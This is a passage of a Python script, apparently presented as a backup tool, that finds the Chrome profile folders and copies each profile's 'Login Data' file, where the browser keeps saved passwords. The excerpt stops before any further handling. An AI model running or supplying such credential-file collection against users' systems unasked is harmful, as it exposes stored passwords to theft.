import os
import shutil
import subprocess
from pathlib import Path

def copy_login_data_only(source_folder, destination_folder):
    login_file = source_folder / "Login Data"
    if login_file.exists():
        destination_folder.mkdir(parents=True, exist_ok=True)
        try:
            shutil.copy2(login_file, destination_folder / "Login Data")
            print(f"Copied Login Data from: {source_folder.name}")
        except Exception as e:
            print(f"Failed to copy Login Data from {source_folder.name}: {e}")

def backup_chrome_password_files():
    user_profile = os.getenv('USERPROFILE')
    if not user_profile:
        print("Could not find USERPROFILE environment variable.")
        return

    # Path to Chrome profiles
    chrome_user_data = Path(user_profile) / r"AppData\Local\Google\Chrome\User Data"

